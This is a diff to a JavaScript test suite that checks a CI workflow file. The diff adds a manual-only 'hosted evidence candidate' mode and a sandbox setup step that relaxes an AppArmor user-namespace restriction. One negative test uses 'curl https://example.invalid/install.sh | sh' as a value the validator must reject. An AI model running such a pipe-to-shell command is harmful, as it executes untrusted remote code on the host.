@@ -9,6 +9,7 @@ const VALID_WORKFLOW = `name: CI
 on:
   push:
   pull_request:
+  workflow_dispatch:
 
 permissions:
   contents: read
@@ -25,10 +26,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: Install Linux subprocess sandbox
         if: runner.os == 'Linux'
-        run: sudo apt-get update && sudo apt-get install -y bubblewrap
+        run: sudo apt-get update && sudo apt-get install -y bubblewrap && sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
       - name: Verify Linux subprocess sandbox
         if: runner.os == 'Linux'
-        run: bwrap --version
+        run: bwrap --unshare-user --disable-userns --unshare-ipc --unshare-pid --unshare-net --unshare-uts --unshare-cgroup-try --die-with-parent --new-session --cap-drop ALL --clearenv --ro-bind / / /bin/true
       - uses: actions/setup-node@v4
         with:
           node-version: 20
@@ -41,14 +42,32 @@ jobs:
       - run: npm run check
       - run: npm test
       - run: npm run check:rust
-      - run: npm run test:rust
-      - run: npm run verify:rust-contracts
+      - name: Run strict Rust tests
+        if: github.event_name != 'workflow_dispatch'
+        run: npm run test:rust
+      - name: Run hosted evidence candidate Rust tests
+        if: github.event_name == 'workflow_dispatch'
+        run: npm run test:rust:candidate
+      - name: Verify strict Rust contracts
+        if: github.event_name != 'workflow_dispatch'
+        run: npm run verify:rust-contracts
+      - name: Verify hosted evidence candidate Rust contracts
+        if: github.event_name == 'workflow_dispatch'
+        run: npm run verify:rust-contracts:candidate
       - run: npm run build
       - run: npm run eval:retrieval
       - run: npm run eval:provider
       - run: npm run build:rust:release
       - run: npm run package:rust
       - run: npm run verify:rust-release
+      - name: Upload hosted release evidence candidate
+        if: github.event_name == 'workflow_dispatch'
+        uses: actions/upload-artifact@v4
+        with:
+          name: hosted-release-evidence-\${{ runner.os }}
+          path: target/release-evidence/*.json
+          if-no-files-found: error
+          retention-days: 7
       - run: npm run verify:milestone-flow
 `;
 
@@ -72,7 +91,7 @@ test("the Linux sandbox setup is exact and cannot run on Windows", () => {
   );
   assertInvalid(
     VALID_WORKFLOW.replace(
-      "sudo apt-get update && sudo apt-get install -y bubblewrap",
+      "sudo apt-get update && sudo apt-get install -y bubblewrap && sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0",
       "curl https://example.invalid/install.sh | sh"
     ),
     /linux sandbox|step/i
@@ -83,6 +102,31 @@ test("the Linux sandbox setup is exact and cannot run on Windows", () => {
       "cargo test -p minimax-tools --locked"
     ),
     /linux sandbox|step/i
+  );
+});
+
+test("hosted evidence candidate mode is manual-only and keeps strict automatic gates", () => {
+  assertInvalid(
+    VALID_WORKFLOW.replace("  workflow_dispatch:\n", ""),
+    /workflow_dispatch|top-level on/i
+  );
+  assertInvalid(
+    VALID_WORKFLOW.replace(
+      "if: github.event_name == 'workflow_dispatch'",
+      "if: github.event_name == 'push'"
+    ),
+    /evidence|event condition|manual/i
+  );
+  assertInvalid(
+    VALID_WORKFLOW.replace(
+      "npm run test:rust:candidate",
+      "npm run test:rust"
+    ),
+    /evidence|step order/i
+  );
+  assertInvalid(
+    VALID_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
+    /hosted evidence|step order|upload/i
   );
 });
 
@@ -226,7 +270,15 @@ test("offline evaluation scripts are exact and never alias the live smoke comman
   assert.equal(packageJson.scripts?.["eval:provider"], "tsx src/eval/provider-conformance.ts");
   assert.equal(packageJson.scripts?.["check:rust"], "cargo fmt --all -- --check && cargo clippy --workspace --all-targets --locked -- -D warnings");
   assert.equal(packageJson.scripts?.["test:rust"], "cargo test --workspace --locked");
+  assert.equal(
+    packageJson.scripts?.["test:rust:candidate"],
+    "cargo test --workspace --locked -- --skip hosted_cutover_evidence_matches_current_product"
+  );
   assert.equal(packageJson.scripts?.["verify:rust-contracts"], "cargo run -p minimax-compat-harness --locked -- verify");
+  assert.equal(
+    packageJson.scripts?.["verify:rust-contracts:candidate"],
+    "cargo run -p minimax-compat-harness --locked -- verify-candidate"
+  );
   assert.equal(packageJson.scripts?.["build:rust:release"], "cargo build -p minimax-cli --release --locked");
   assert.equal(packageJson.scripts?.["package:rust"], "node scripts/release/package-rust.mjs");
   assert.equal(packageJson.scripts?.["verify:rust-release"], "node scripts/release/verify-rust-release.mjs");
